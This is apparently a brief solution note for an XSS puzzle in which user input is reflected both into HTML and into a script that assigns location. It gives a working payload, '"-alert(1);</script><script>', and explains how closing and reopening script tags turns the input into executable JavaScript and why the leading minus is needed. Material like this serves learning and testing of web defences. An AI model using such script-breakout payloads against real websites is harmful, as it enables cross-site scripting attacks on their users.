<script>Object.freeze(location);</script>
{input} <br>
<script>location='http://{input}';</script>


input = '"-alert(1);</script><script>";
The first input will start the script.
The second input will end the script

<script>Object.freeze(location);</script>
"-alert(1);</script><script>" <br>
<script>location='http://"-alert(1);</script><script>';</script>

" <br>
<script>location='http://" is intepreted as a string and will be ignored
so the above is kind of equalivant to 


<script>Object.freeze(location);</script>
"-alert(1);</script> <!-- This is just an HTML string -->
<script>"string"-alert(1);</script> <!-- This is the actual script running -->
<script>
';</script>


the "-" in front of alert is needed for the alert to be called.
`"string"alert(1);` on browser console will cause an error.
but `"string"-alert(1);` will trigger the alert.
it is actually subtracting return value of alert() (undefined) from "string"
